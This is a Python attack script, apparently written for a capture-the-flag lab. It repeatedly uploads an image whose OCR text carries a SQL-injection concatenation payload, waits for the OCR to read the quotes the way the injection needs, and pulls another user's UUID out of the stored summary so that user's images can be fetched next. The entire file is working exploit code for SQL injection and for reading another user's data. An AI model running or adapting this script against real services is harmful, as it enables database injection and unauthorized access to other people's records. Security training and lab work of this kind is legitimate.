# brute_ocr.py — the OCR reads quotes non-deterministically. Re-upload the SAME 2-quote
# concat payload many times; on some read the OCR yields exactly two single quotes, the
# subquery executes, and the row stores the victim's user_id. Stop as soon as we see a
# foreign UUID (or a 200 whose summary_ocr is a bare UUID).
import requests, re, time
BASE = "https://chl-f4e46c02-efed-4276-8edf-ffade8aa3cf6-mis-viajes-v2.softwareseguro.com.ar"
UID  = "ea42cd39-001b-4fb5-a509-449322674687"

uri = open("c1_datauri.txt").read().strip()   # z? actually c1 = a'||(SELECT ...)||'a  (2 quotes)
UURE = re.compile(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}")

hits = []
for i in range(40):
    r = requests.post(f"{BASE}/upload", json={"image":uri,"description":f"B{i}","user_id":UID})
    if r.status_code == 200:
        # read back this row's summary_ocr
        data = requests.get(f"{BASE}/images/{UID}").json()
        row = next((x for x in data if x.get("description")==f"B{i}"), None)
        ocr = row.get("summary_ocr","") if row else ""
        found = [u for u in UURE.findall(str(ocr)) if u != UID]
        tag = f"  <<< UUID {found}" if found else ""
        print(f"[{i}] 200 ocr={ocr!r}{tag}")
        if found:
            hits += found
            print("\nVICTIM user_id FOUND:", found[0]); break
    else:
        print(f"[{i}] {r.status_code}")
    time.sleep(0.2)
if hits:
    print("\n=> Next: GET /images/%s" % hits[0])
else:
    print("\nno leak yet; run again or we adjust payload")
